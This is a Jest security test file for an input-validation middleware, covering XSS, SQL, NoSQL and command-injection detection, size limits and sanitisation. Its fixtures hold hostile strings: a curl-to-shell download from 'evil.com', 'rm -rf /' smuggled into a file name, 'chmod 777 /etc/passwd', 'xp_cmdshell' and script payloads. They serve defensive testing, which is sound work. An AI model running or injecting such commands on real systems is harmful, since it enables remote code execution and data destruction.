import { describe, it, expect, beforeEach, jest } from '@jest/globals'
import { validateInput, ValidationError, SecurityError } from '@/middleware'

describe('Input Validation Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks()
  })

  describe('XSS Prevention', () => {
    it('should detect and reject script tags', () => {
      const maliciousInput = {
        message: '<script>alert("XSS")</script>',
        data: 'normal content'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential XSS attack detected')
    })

    it('should detect and reject javascript: protocol', () => {
      const maliciousInput = {
        url: 'javascript:alert("XSS")',
        description: 'malicious link'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential XSS attack detected')
    })

    it('should detect and reject event handlers', () => {
      const maliciousInput = {
        html: '<img src="x" onerror="alert(\'XSS\')">',
        content: 'malicious image'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential XSS attack detected')
    })

    it('should detect and reject PHP code', () => {
      const maliciousInput = {
        comment: '<?php echo "malicious"; ?>',
        text: 'normal text'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential XSS attack detected')
    })

    it('should detect and reject template literals', () => {
      const maliciousInput = {
        expression: '${malicious.code}',
        value: 'test'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential XSS attack detected')
    })

    it('should detect and reject eval expressions', () => {
      const maliciousInput = {
        code: 'eval(malicious())',
        description: 'malicious code'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential XSS attack detected')
    })
  })

  describe('SQL Injection Prevention', () => {
    it('should detect and reject SQL keywords', () => {
      const maliciousInput = {
        query: 'SELECT * FROM users WHERE id = 1',
        params: 'normal'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential SQL injection detected')
    })

    it('should detect and reject SQL comments', () => {
      const maliciousInput = {
        comment: 'test -- malicious comment',
        text: 'normal'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential SQL injection detected')
    })

    it('should detect and reject boolean-based SQL injection', () => {
      const maliciousInput = {
        condition: '1 OR 1=1',
        value: 'test'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential SQL injection detected')
    })

    it('should detect and reject SQL union attacks', () => {
      const maliciousInput = {
        query: 'SELECT name FROM users UNION SELECT password FROM admins',
        params: {}
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential SQL injection detected')
    })

    it('should detect and reject stored procedure attacks', () => {
      const maliciousInput = {
        command: 'EXEC xp_cmdshell',
        description: 'malicious command'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential SQL injection detected')
    })
  })

  describe('NoSQL Injection Prevention', () => {
    it('should detect and reject $where operators', () => {
      const maliciousInput = {
        query: { $where: 'this.name == "admin"' },
        options: {}
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential NoSQL injection detected')
    })

    it('should detect and reject $ne operators', () => {
      const maliciousInput = {
        condition: { $ne: null },
        value: 'test'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential NoSQL injection detected')
    })

    it('should detect and reject $gt operators', () => {
      const maliciousInput = {
        filter: { $gt: 0 },
        data: 'test'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential NoSQL injection detected')
    })

    it('should detect and reject $lt operators', () => {
      const maliciousInput = {
        range: { $lt: 100 },
        value: 'test'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential NoSQL injection detected')
    })

    it('should detect and reject $regex operators', () => {
      const maliciousInput = {
        pattern: { $regex: '.*' },
        text: 'test'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential NoSQL injection detected')
    })
  })

  describe('Command Injection Prevention', () => {
    it('should detect and reject shell operators', () => {
      const maliciousInput = {
        command: 'ls; rm -rf /',
        description: 'malicious command'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential command injection detected')
    })

    it('should detect and reject shell metacharacters', () => {
      const maliciousInput = {
        filename: 'test$(rm -rf /).txt',
        content: 'malicious'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential command injection detected')
    })

    it('should detect and reject command substitution', () => {
      const maliciousInput = {
        path: '`whoami`',
        value: 'test'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential command injection detected')
    })

    it('should detect and reject shell commands', () => {
      const maliciousInput = {
        action: '/bin/sh -c "echo hacked"',
        params: {}
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential command injection detected')
    })

    it('should detect and reject network commands', () => {
      const maliciousInput = {
        command: 'curl http://evil.com/malicious.sh | sh',
        description: 'remote execution'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential command injection detected')
    })

    it('should detect and reject file system commands', () => {
      const maliciousInput = {
        operation: 'chmod 777 /etc/passwd',
        target: 'system'
      }

      expect(() => validateInput(maliciousInput)).toThrow(ValidationError)
      expect(() => validateInput(maliciousInput)).toThrow('Potential command injection detected')
    })
  })

  describe('Input Size and Structure Validation', () => {
    it('should reject oversized input data', () => {
      const largeInput = {
        data: 'x'.repeat(20000), // 20KB of data
        metadata: {}
      }

      expect(() => validateInput(largeInput, { maxSize: 10000 })).toThrow(ValidationError)
      expect(() => validateInput(largeInput, { maxSize: 10000 })).toThrow('Input data too large')
    })

    it('should reject deeply nested objects', () => {
      const deepInput = {
        level1: {
          level2: {
            level3: {
              level4: {
                level5: {
                  level6: 'too deep'
                }
              }
            }
          }
        }
      }

      expect(() => validateInput(deepInput, { maxDepth: 5 })).toThrow(ValidationError)
      expect(() => validateInput(deepInput, { maxDepth: 5 })).toThrow('Input data too deeply nested')
    })

    it('should validate required fields', () => {
      const incompleteInput = {
        name: 'test',
        // missing required 'email' field
      }

      expect(() => validateInput(incompleteInput, { required: ['name', 'email'] })).toThrow(ValidationError)
      expect(() => validateInput(incompleteInput, { required: ['name', 'email'] })).toThrow('Required field \'email\' is missing')
    })

    it('should validate field names', () => {
      const invalidInput = {
        'valid-field': 'ok',
        'invalid field with spaces': 'not ok',
        'invalid-field-with-dashes': 'also not ok'
      }

      expect(() => validateInput(invalidInput)).toThrow(ValidationError)
      expect(() => validateInput(invalidInput)).toThrow('Invalid field name')
    })
  })

  describe('Sanitization', () => {
    it('should sanitize HTML entities', () => {
      const input = {
        message: '<script>alert("XSS")</script>',
        description: 'Normal & safe content'
      }

      const result = validateInput(input, { sanitize: true })

      expect(result.message).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;')
      expect(result.description).toBe('Normal &amp; safe content')
    })

    it('should sanitize recursively', () => {
      const input = {
        user: {
          name: '<script>alert("XSS")</script>',
          profile: {
            bio: 'User bio with <b>HTML</b>',
            contacts: {
              email: 'test@example.com',
              note: 'Note with "quotes" & symbols'
            }
          }
        }
      }

      const result = validateInput(input, { sanitize: true })

      expect(result.user.name).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;')
      expect(result.user.profile.bio).toBe('User bio with &lt;b&gt;HTML&lt;/b&gt;')
      expect(result.user.profile.contacts.note).toBe('Note with &quot;quotes&quot; &amp; symbols')
    })

    it('should preserve data structure when sanitizing', () => {
      const input = {
        string: 'test',
        number: 42,
        boolean: true,
        array: ['<script>', 'normal'],
        object: { nested: '<b>bold</b>' }
      }

      const result = validateInput(input, { sanitize: true })

      expect(typeof result.string).toBe('string')
      expect(typeof result.number).toBe('number')
      expect(typeof result.boolean).toBe('boolean')
      expect(Array.isArray(result.array)).toBe(true)
      expect(typeof result.object).toBe('object')
      expect(typeof result.object.nested).toBe('string')
    })
  })

  describe('Performance under Attack', () => {
    it('should handle large malicious inputs efficiently', () => {
      const largeMaliciousInput = {
        data: '<script>'.repeat(1000) + 'x'.repeat(50000) + '</script>'.repeat(1000),
        metadata: {}
      }

      const startTime = Date.now()
      
      expect(() => validateInput(largeMaliciousInput)).toThrow(ValidationError)
      
      const endTime = Date.now()
      const processingTime = endTime - startTime

      expect(processingTime).toBeLessThan(1000) // Should process large input quickly
    })

    it('should handle complex nested attacks', () => {
      const complexAttack = {
        level1: {
          sql: 'SELECT * FROM users',
          xss: '<script>alert(1)</script>',
          level2: {
            nosql: { $where: 'this.admin == true' },
            cmd: 'rm -rf /',
            level3: {
              level4: {
                level5: {
                  deep: {
                    attack: 'eval(malicious())'
                  }
                }
              }
            }
          }
        }
      }

      const startTime = Date.now()
      
      expect(() => validateInput(complexAttack)).toThrow(ValidationError)
      
      const endTime = Date.now()
      const processingTime = endTime - startTime

      expect(processingTime).toBeLessThan(500) // Should handle complex attacks quickly
    })
  })
})
